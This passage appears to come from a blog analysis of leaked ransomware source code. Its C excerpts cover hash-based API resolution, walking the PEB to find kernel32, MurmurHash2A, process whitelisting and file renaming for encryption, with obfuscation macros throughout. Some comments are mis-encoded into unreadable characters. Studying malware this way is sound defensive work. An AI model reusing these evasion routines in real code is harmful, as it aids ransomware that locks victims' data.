<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CheckForForvardedProc</span><span class="params">(ADDR Addr, PIMAGE_EXPORT_DIRECTORY Table, DWORD DataSize)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (Addr &gt; (ADDR)Table) &#123;</span><br><span class="line"></span><br><span class="line">		morphcode(Addr);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ((Addr - (ADDR)Table &lt; DataSize)) &#123;</span><br><span class="line"></span><br><span class="line">			morphcode(Table);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="GetFunctionAddresss"><a href="#GetFunctionAddresss" class="headerlink" title="GetFunctionAddresss"></a>GetFunctionAddresss</h4><ul>
<li>convert the function address that in the export function table.</li>
<li>use the Ordinal to get the RVA</li>
<li>RVA TO VA</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ADDR <span class="title function_">GetFunctionAddresss</span><span class="params">(HMODULE Module, PIMAGE_EXPORT_DIRECTORY Table, LONG Ordinal)</span></span><br><span class="line">&#123;</span><br><span class="line">	PDWORD AddrTable = (PDWORD)RVATOVA(Module, Table-&gt;AddressOfFunctions);</span><br><span class="line">	morphcode(AddrTable);</span><br><span class="line">	DWORD RVA = AddrTable[Ordinal];</span><br><span class="line">	morphcode(RVA);</span><br><span class="line">	ADDR Ret = (ADDR)RVATOVA(Module, RVA);</span><br><span class="line">	morphcode(Ret);</span><br><span class="line">	<span class="keyword">return</span> Ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="ReturnAddress"><a href="#ReturnAddress" class="headerlink" title="ReturnAddress"></a>ReturnAddress</h4><blockquote>
<p>this function is not called in the whole code.</p>
<p>void CopyMemory(</p>
<p>  <em>In</em>    PVOID  Destination,</p>
<p>  <em>In</em> const VOID  *Source,</p>
<p>  <em>In</em>    SIZE_T Length </p>
<p>);</p>
</blockquote>
<p>get the first 4 byte of dwAddress, then temp+&#x3D;1 ,to get the three byte code(I guess it is the jmp address).It’s will Maybe used in hook.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">VOID <span class="title function_">ReturnAddress</span><span class="params">(PDWORD pAddress, DWORD dwAddress)</span></span><br><span class="line">&#123;</span><br><span class="line">	DWORD temp = dwAddress + <span class="number">1</span>;</span><br><span class="line">	morphcode(temp);</span><br><span class="line">	CopyMemory(&amp;temp, &amp;dwAddress, <span class="keyword">sizeof</span>(DWORD));</span><br><span class="line">	morphcode(temp);</span><br><span class="line">	temp++;</span><br><span class="line">	CopyMemory(pAddress, &amp;temp, <span class="keyword">sizeof</span>(DWORD));</span><br><span class="line">	morphcode(pAddress);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="FindFunction"><a href="#FindFunction" class="headerlink" title="FindFunction"></a>FindFunction</h4><blockquote>
<p>this function is not called.</p>
</blockquote>
<p>return the Ordinary the hash in the Module’s export table.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">STATIC</span><br><span class="line">INT </span><br><span class="line"><span class="title function_">FindFunction</span><span class="params">(</span></span><br><span class="line"><span class="params">	__in HMODULE Module,</span></span><br><span class="line"><span class="params">	__in  DWORD Hash,</span></span><br><span class="line"><span class="params">	__in PIMAGE_EXPORT_DIRECTORY Table</span></span><br><span class="line"><span class="params">	)</span></span><br><span class="line">&#123;</span><br><span class="line">	INT Ordinal = <span class="number">0</span>;</span><br><span class="line">	morphcode(Ordinal);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (HIWORD(Hash) == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 腮屐 趔黻鲨?镱 甯 眍戾痼</span></span><br><span class="line">		Ordinal = (LOWORD(Hash)) - Table-&gt;Base;</span><br><span class="line">		morphcode(Ordinal);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		PDWORD NamesTable = (DWORD*)RVATOVA(Module, Table-&gt;AddressOfNames);</span><br><span class="line"></span><br><span class="line">		morphcode(NamesTable);</span><br><span class="line"></span><br><span class="line">		PWORD  OrdinalTable = (WORD*)RVATOVA(Module, Table-&gt;AddressOfNameOrdinals);</span><br><span class="line"></span><br><span class="line">		morphcode(OrdinalTable);</span><br><span class="line"></span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">		<span class="type">char</span>* ProcName;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; Table-&gt;NumberOfNames; ++i)</span><br><span class="line">		&#123;</span><br><span class="line"></span><br><span class="line">			ProcName = (<span class="type">char</span>*)RVATOVA(Module, *NamesTable);</span><br><span class="line">			morphcode(ProcName);</span><br><span class="line">			DWORD ProcHash = MurmurHash2A(ProcName, StrLen(ProcName), HASHING_SEED);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (ProcHash == Hash)</span><br><span class="line">			&#123;</span><br><span class="line">				morphcode(Ordinal);</span><br><span class="line"></span><br><span class="line">				Ordinal = *OrdinalTable;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="comment">// 逾咫梓桠噱?镱玷鲨??蜞犭桷?</span></span><br><span class="line">			++NamesTable;</span><br><span class="line">			++OrdinalTable;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> Ordinal;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="GetApiAddr"><a href="#GetApiAddr" class="headerlink" title="GetApiAddr"></a>GetApiAddr</h4><p>find the ProcNameHash in the dll export function table, and then call function</p>
<ul>
<li>GetFunctionAddresss get the function address,and pass to the Next function CheckForForvardedProc</li>
<li>CheckForForvardedProc check if the function is outside the export function table<ul>
<li>GetForvardedProc <ul>
<li>getapi::GetProcAddressEx(DLLName, 0, OrdNomber);</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">ADDR <span class="title function_">GetApiAddr</span><span class="params">(HMODULE Module, DWORD ProcNameHash, ADDR* Address)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/*----------- 泽黻鲨 忸玮疣弪 噤疱?趔黻鲨?镱 甯 磬玮囗棹 -----------*/</span></span><br><span class="line">	<span class="comment">// 项塍鬣屐 噤疱?漕镱腠栩咫 PE 玎泐腩怅钼</span></span><br><span class="line">	PIMAGE_OPTIONAL_HEADER poh = (PIMAGE_OPTIONAL_HEADER)((<span class="type">char</span>*)Module + ((PIMAGE_DOS_HEADER)Module)-&gt;e_lfanew + <span class="keyword">sizeof</span>(DWORD) + <span class="keyword">sizeof</span>(IMAGE_FILE_HEADER));</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 项塍鬣屐 噤疱?蜞犭桷?耧铕蜞</span></span><br><span class="line">	PIMAGE_EXPORT_DIRECTORY Table = (IMAGE_EXPORT_DIRECTORY*)RVATOVA(Module, poh-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);</span><br><span class="line"></span><br><span class="line">	DWORD DataSize = poh-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;</span><br><span class="line"></span><br><span class="line">	INT Ordinal; <span class="comment">// 皖戾?礤钺躅滂祛?磬?趔黻鲨?</span></span><br><span class="line">	BOOL Found = FALSE;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (HIWORD(ProcNameHash) == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 腮屐 趔黻鲨?镱 甯 眍戾痼</span></span><br><span class="line">		Ordinal = (LOWORD(ProcNameHash)) - Table-&gt;Base;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// 腮屐 趔黻鲨?镱 眍戾痼</span></span><br><span class="line">		PDWORD NamesTable = (DWORD*)RVATOVA(Module, Table-&gt;AddressOfNames);</span><br><span class="line">		PWORD  OrdinalTable = (WORD*)RVATOVA(Module, Table-&gt;AddressOfNameOrdinals);</span><br><span class="line"></span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">		<span class="type">char</span>* ProcName;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; Table-&gt;NumberOfNames; ++i)</span><br><span class="line">		&#123;</span><br><span class="line"></span><br><span class="line">			ProcName = (<span class="type">char</span>*)RVATOVA(Module, *NamesTable);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (MurmurHash2A(ProcName, StrLen(ProcName), HASHING_SEED) == ProcNameHash)</span><br><span class="line">			&#123;</span><br><span class="line">				Ordinal = *OrdinalTable;</span><br><span class="line">				Found = TRUE;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="comment">// 逾咫梓桠噱?镱玷鲨??蜞犭桷?</span></span><br><span class="line">			++NamesTable;</span><br><span class="line">			++OrdinalTable;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 礤 磬?眍戾?</span></span><br><span class="line">	<span class="keyword">if</span> (!Found) &#123;</span><br><span class="line"></span><br><span class="line">		*Address = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ADDR Ret = GetFunctionAddresss(Module, Table, Ordinal);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (CheckForForvardedProc(Ret, Table, DataSize)) &#123;</span><br><span class="line">		Ret = (ADDR)GetForvardedProc((PCHAR)Ret);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//ReturnAddress(Address, Ret + 1);</span></span><br><span class="line">	<span class="keyword">return</span> Ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="GetHashBase"><a href="#GetHashBase" class="headerlink" title="GetHashBase"></a>GetHashBase</h4><p>get the Module Name ,generate  and return the hash</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">GetHashBase(__in LDR_MODULE* mdll)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> name[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line">	<span class="type">size_t</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (mdll-&gt;dllname.Buffer[i] &amp;&amp; i &lt; <span class="keyword">sizeof</span>(name) - <span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		morphcode(mdll-&gt;dllname.Buffer[i]);</span><br><span class="line"></span><br><span class="line">		name[i] = (<span class="type">char</span>)mdll-&gt;dllname.Buffer[i];</span><br><span class="line"></span><br><span class="line">		morphcode(name[i]);</span><br><span class="line"></span><br><span class="line">		i++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	name[i] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> MurmurHash2A(name, StrLen(name), HASHING_SEED);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="GetKernel32"><a href="#GetKernel32" class="headerlink" title="GetKernel32"></a>GetKernel32</h4><p>the peb is used to get the DllList.Loop the DllList and find the kernel32.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">	mdl = (LDR_MODULE*)mdl-&gt;e[<span class="number">0</span>].Flink;</span><br><span class="line">	morphcode(mdl);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (mdl-&gt;base != nullptr)</span><br><span class="line">	&#123;</span><br><span class="line">		morphcode(mdl-&gt;base);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (GetHashBase(mdl) == KERNEL32DLL_HASH) &#123; <span class="comment">// KERNEL32.DLL</span></span><br><span class="line"></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (mlink != (INT_PTR)mdl);</span><br></pre></td></tr></table></figure>

<p>then you can get the kernel32 handle with the base</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">krnl32 = static_cast&lt;HMODULE&gt;(mdl-&gt;base);</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">GetKernel32()</span><br><span class="line">&#123;</span><br><span class="line">	HMODULE krnl32;</span><br><span class="line">	PCWCHAR Kernel32Dll = OBFW(<span class="string">L&quot;Kernel32.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line">	<span class="type">const</span> <span class="keyword">auto</span> ModuleList = <span class="number">0x18</span>;</span><br><span class="line">	<span class="type">const</span> <span class="keyword">auto</span> ModuleListFlink = <span class="number">0x18</span>;</span><br><span class="line">	<span class="type">const</span> <span class="keyword">auto</span> KernelBaseAddr = <span class="number">0x10</span>;</span><br><span class="line">	<span class="type">const</span> INT_PTR peb = __readgsqword(<span class="number">0x60</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">	<span class="type">int</span> ModuleList = <span class="number">0x0C</span>;</span><br><span class="line">	<span class="type">int</span> ModuleListFlink = <span class="number">0x10</span>;</span><br><span class="line">	<span class="type">int</span> KernelBaseAddr = <span class="number">0x10</span>;</span><br><span class="line">	INT_PTR peb = __readfsdword(<span class="number">0x30</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="type">const</span> <span class="keyword">auto</span> mdllist = *(INT_PTR*)(peb + ModuleList);</span><br><span class="line">	morphcode(mdllist);</span><br><span class="line">	<span class="type">const</span> <span class="keyword">auto</span> mlink = *(INT_PTR*)(mdllist + ModuleListFlink);</span><br><span class="line">	morphcode(mlink);</span><br><span class="line">	<span class="keyword">auto</span> krnbase = *(INT_PTR*)(mlink + KernelBaseAddr);</span><br><span class="line">	morphcode(krnbase);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">auto</span> mdl = (LDR_MODULE*)mlink;</span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		mdl = (LDR_MODULE*)mdl-&gt;e[<span class="number">0</span>].Flink;</span><br><span class="line">		morphcode(mdl);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (mdl-&gt;base != nullptr)</span><br><span class="line">		&#123;</span><br><span class="line">			morphcode(mdl-&gt;base);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (GetHashBase(mdl) == KERNEL32DLL_HASH) &#123; <span class="comment">// KERNEL32.DLL</span></span><br><span class="line"></span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">while</span> (mlink != (INT_PTR)mdl);</span><br><span class="line"></span><br><span class="line">	krnl32 = static_cast&lt;HMODULE&gt;(mdl-&gt;base);</span><br><span class="line">	morphcode(krnl32);</span><br><span class="line">	<span class="keyword">return</span> krnl32;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h3><h4 id="MurmurHash2A"><a href="#MurmurHash2A" class="headerlink" title="MurmurHash2A"></a>MurmurHash2A</h4><ul>
<li><p>convert to lowchar</p>
</li>
<li><p>every 4 byte convert to unsigned int data ,then mmix with the seed. If the length is less than 4, Convert it one by one,then mmix</p>
<ul>
<li>&#96;&#96;&#96;<br>  #define mmix(h,k) { k *&#x3D; m; k ^&#x3D; k &gt;&gt; r; k *&#x3D; m; h *&#x3D; m; h ^&#x3D; k; }  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- finally return the hash by argument h</span><br><span class="line"></span><br><span class="line">```c</span><br><span class="line">#include &quot;hash.h&quot;</span><br><span class="line">#include &quot;..\memory.h&quot;</span><br><span class="line"></span><br><span class="line">#define mmix(h,k) &#123; k *= m; k ^= k &gt;&gt; r; k *= m; h *= m; h ^= k; &#125;</span><br><span class="line">#define LowerChar(C) if (C &gt;= &#x27;A&#x27; &amp;&amp; C &lt;= &#x27;Z&#x27;) &#123;C = C + (&#x27;a&#x27;-&#x27;A&#x27;);&#125;</span><br><span class="line"></span><br><span class="line">unsigned int MurmurHash2A(const void* key, int len, unsigned int seed)</span><br><span class="line">&#123;</span><br><span class="line">	char temp[64];</span><br><span class="line">	RtlSecureZeroMemory(temp, 64);</span><br><span class="line">	memory::Copy(temp, (PVOID)key, len);</span><br><span class="line"></span><br><span class="line">	for (int i = 0; i &lt; len; i++) &#123;</span><br><span class="line">		LowerChar(temp[i]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	const unsigned int m = 0x5bd1e995;</span><br><span class="line">	const int r = 24;</span><br><span class="line">	unsigned int l = len;</span><br><span class="line"></span><br><span class="line">	const unsigned char* data = (const unsigned char*)temp;</span><br><span class="line"></span><br><span class="line">	unsigned int h = seed;</span><br><span class="line">	unsigned int k;</span><br><span class="line"></span><br><span class="line">	while (len &gt;= 4)</span><br><span class="line">	&#123;</span><br><span class="line">		k = *(unsigned int*)data;</span><br><span class="line"></span><br><span class="line">		mmix(h, k);</span><br><span class="line"></span><br><span class="line">		data += 4;</span><br><span class="line">		len -= 4;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	unsigned int t = 0;</span><br><span class="line"></span><br><span class="line">	switch (len)</span><br><span class="line">	&#123;</span><br><span class="line">	case 3: t ^= data[2] &lt;&lt; 16;</span><br><span class="line">	case 2: t ^= data[1] &lt;&lt; 8;</span><br><span class="line">	case 1: t ^= data[0];</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	mmix(h, t);</span><br><span class="line">	mmix(h, l);</span><br><span class="line"></span><br><span class="line">	h ^= h &gt;&gt; 13;</span><br><span class="line">	h *= m;</span><br><span class="line">	h ^= h &gt;&gt; 15;</span><br><span class="line"></span><br><span class="line">	return h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h2 id="Cryptor"><a href="#Cryptor" class="headerlink" title="Cryptor"></a>Cryptor</h2><h3 id="cryptor"><a href="#cryptor" class="headerlink" title="cryptor"></a>cryptor</h3><h4 id="cryptor-SetWhiteListProcess"><a href="#cryptor-SetWhiteListProcess" class="headerlink" title="cryptor::SetWhiteListProcess"></a>cryptor::SetWhiteListProcess</h4><p>Set white list Process, pass the specifical process（explorer.exe）.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">VOID </span><br><span class="line"><span class="title function_">process_killer::GetWhiteListProcess</span><span class="params">(__out PPID_LIST PidList)</span></span><br><span class="line">&#123;</span><br><span class="line">	HANDLE hSnapShot = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (hSnapShot == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	PROCESSENTRY32W pe32;</span><br><span class="line">	pe32.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32W);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!pProcess32FirstW(hSnapShot, &amp;pe32)) &#123;</span><br><span class="line"></span><br><span class="line">		pCloseHandle(hSnapShot);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!plstrcmpiW(pe32.szExeFile, OBFW(<span class="string">L&quot;explorer.exe&quot;</span>))) &#123;</span><br><span class="line"></span><br><span class="line">			PPID Pid = (PPID)m_malloc(<span class="keyword">sizeof</span>(PID));</span><br><span class="line">			<span class="keyword">if</span> (!Pid) &#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			Pid-&gt;dwProcessId = pe32.th32ProcessID;</span><br><span class="line">			TAILQ_INSERT_TAIL(PidList, Pid, Entries);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">while</span> (pProcess32NextW(hSnapShot, &amp;pe32));</span><br><span class="line"></span><br><span class="line">	pCloseHandle(hSnapShot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="cryptor-ChangeFileName"><a href="#cryptor-ChangeFileName" class="headerlink" title="cryptor::ChangeFileName"></a>cryptor::ChangeFileName</h4><p>just change the filename, used to add the extension for Encrypted file.</p>
